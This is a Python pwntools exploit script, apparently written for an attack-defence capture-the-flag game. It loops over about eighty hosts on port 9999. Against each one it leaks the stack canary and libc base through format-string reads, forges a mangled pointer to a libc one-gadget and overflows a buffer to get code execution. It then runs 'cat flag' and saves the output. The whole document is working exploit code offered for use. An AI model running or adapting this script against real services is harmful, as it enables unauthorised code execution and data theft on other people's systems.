from pwn import*
def payload(ip):
	libc =ELF('./libc-2.27.so')
	try:
		p = remote(ip,9999,timeout=0.5)
		p.sendline('%p%p%p%p%p%p%p%p%p%p%pCanary:%p%pLIBC:%p%p%p%p%pST:%p')
		p.recvuntil('Canary:')
		canary = int(p.recv(18),16)
		p.recvuntil('LIBC:')
		libc_base = int(p.recv(14),16) - 0x3F86DB
		p.recvuntil('ST:')
		stack = int(p.recv(14),16)
#		log.info('Canary:\t' + hex(canary))
#		log.info('LIBC:\t'+ hex(libc_base))
#		log.info('Stack:\t' + hex(stack))
		#gdb.attach(p,"b *_printf_chk")
		p.sendline('%p%p%p%p%p%p%p%p%p%pRand%s'.ljust(0x30,'\x00') + p64(libc_base - 0x900 + 0x30))
		p.recvuntil('Rand')
		rand = u64(p.recv(8))
#		log.info('Rand\t' + hex(rand))
		key = (rand^(libc_base + 4201616))&0xFFFFFFFFFFFFFFFF
		rce = key^(libc_base + 0x10A45C)
		payload = 'F'*0x38 + p64(canary) + '\x00'*0x18 + p64(libc_base - 0x900)
		payload = payload.ljust(0x878,'\x00')
		payload += p64(canary)
		payload += p64(rce)
		#gdb.attach(p,"b *0x7ffff7823713")
		p.sendline(payload)
		p.sendline('cat flag')
		data = p.recvline(timeout=0.5)
		res = p + '\t' + data
		log.info(res)
				
		with open('./FLAG',"w") as file:
			file.write(res)
		sleep(0.1)
		p.close()
	except:
		return 0
		

for i in range(1,81):
	if i != 20:
		payload('172.20.1' + str(i).rjust(2,'0') + '.103')

